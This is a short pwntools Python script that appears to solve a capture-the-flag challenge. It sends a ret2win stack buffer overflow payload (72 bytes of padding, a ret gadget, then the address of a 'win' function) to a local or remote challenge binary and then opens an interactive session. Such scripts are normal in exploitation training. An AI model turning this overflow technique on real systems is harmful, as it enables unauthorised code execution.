#!/usr/bin/env python3
from pathlib import Path

from pwn import *


def main():
    here = Path(__file__).resolve().parent
    context.binary = elf = ELF(str(here / "challenge"), checksec=False)
    context.log_level = os.getenv("LOG", "info")

    host = os.getenv("HOST")
    port = int(os.getenv("PORT", "1337"))
    io = remote(host, port) if host else process(elf.path, cwd=str(here))

    offset = 72
    rop = ROP(elf)
    ret = rop.find_gadget(["ret"]).address

    payload = b"A" * offset + p64(ret) + p64(elf.symbols["win"])
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
